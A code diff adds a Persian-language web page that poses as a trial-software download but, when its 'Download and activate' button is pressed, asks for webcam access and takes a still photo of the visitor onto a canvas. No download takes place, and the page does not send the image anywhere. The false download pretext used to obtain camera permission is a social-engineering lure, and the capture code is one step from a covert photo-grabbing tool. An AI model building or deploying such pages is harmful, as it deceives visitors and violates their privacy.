@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>دانلود برنامه</title>
+
+<style>
+body{
+    margin:0;
+    font-family:tahoma;
+    background:#f2f2f2;
+    text-align:center;
+}
+.card{
+    background:white;
+    width:90%;
+    max-width:350px;
+    margin:40px auto;
+    padding:25px;
+    border-radius:15px;
+    box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+button{
+    padding:12px 20px;
+    border:none;
+    background:#28a745;
+    color:white;
+    font-size:16px;
+    border-radius:10px;
+    cursor:pointer;
+}
+video,canvas{
+    width:100%;
+    max-width:300px;
+    margin-top:15px;
+    border-radius:10px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+    <h2>دانلود نسخه آزمایشی</h2>
+    <p>برای فعال‌سازی نسخه آزمایشی، اجازه دسترسی به دوربین لازم است.</p>
+
+    <button onclick="startCamera()">دانلود و فعال‌سازی</button>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <p id="status"></p>
+</div>
+
+<script>
+async function startCamera(){
+
+    const status = document.getElementById("status");
+
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        status.innerHTML = "دوربین فعال شد";
+
+        setTimeout(()=>{
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video,0,0);
+
+            status.innerHTML += "<br>عکس گرفته شد";
+
+            stream.getTracks().forEach(track => track.stop());
+
+        },2000);
+
+    }catch(err){
+        status.innerHTML = "خطا: " + err.message;
+    }
+}
+</script>
+
+</body>
+</html>
